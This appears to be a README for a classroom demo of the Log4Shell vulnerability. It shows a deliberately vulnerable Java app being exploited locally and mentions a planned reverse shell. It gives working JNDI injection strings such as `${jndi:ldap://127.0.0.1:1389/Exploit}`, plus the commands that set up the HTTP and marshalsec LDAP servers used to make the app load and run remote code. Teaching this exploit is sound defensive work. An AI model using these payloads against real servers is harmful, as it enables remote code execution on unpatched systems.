# Demos

## Plans
In our lecture, we plan to show a progression of malicious intent. From polluting the vulnerableApp logs to getting an application to open remotely and then finally, we'll attempt to set up a reverse shell to the application server in a real world example.

This demo focuses on getting an application to run from the vulnerableApp's server. This demo can be used to show the progression from polluting logs to opening an application by entering these strings respectively `${java:version}` and `${jndi:ldap://127.0.0.1:1389/Exploit}.`

## Demo 1
We have created a vulnerableApp which can be exploited via Log4J vulnerability. 

A basic description on what is happening is:
- vulnerableApp is running
- We as an attacker host a LDAP server and a HTTP server (which contains our Exploit.class, i.e. malicious code)
- Then the hacker sends a string like `${jndi:ldap://127.0.0.1:1389/Exploit}` as an input. 
- This vulnerableApp will then make the remote call to the LDAP server which redirects to our HTTP server which sends the Exploit.class to the vulnerableApp. The app then does class loading which runs our malicious code on their end.

## Requirements
- [ ] Max Java 1.8.18
- [ ] Log4J Version 2.14.1 (Core and API)
- [ ] Python3 (creating http server)

## Commands
All commands shd be run from the `/poc` directory

Start HTTP Server
```
python3 -m http.server 8000

```

Create LDAP Server and Connect to HTTP
```
java -cp ./target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#Exploit"

```

Run the vulnerableApp and provide this string: `${jndi:ldap://127.0.0.1:1389/Exploit}` when prompted for input

You should see the effect of the command specified in Exploit.java on your system
